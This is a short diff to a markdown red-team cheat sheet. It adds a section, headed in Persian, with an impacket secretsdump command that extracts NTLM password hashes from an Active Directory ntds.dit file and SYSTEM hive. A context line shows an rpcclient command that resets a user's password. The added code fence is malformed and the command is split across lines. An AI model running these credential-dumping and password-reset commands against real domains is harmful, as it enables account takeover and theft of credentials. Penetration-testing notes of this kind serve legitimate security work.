@@ -1411,3 +1411,10 @@ enumprivs
 ```text
 setuserinfo2 audit2020 23 'redteam'
 ```
+
+## استخراج NTLM از فایل ntds.dit
+
+``text
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system system -
+hashes lmhash:nthash LOCAL -output nt-hash
+```
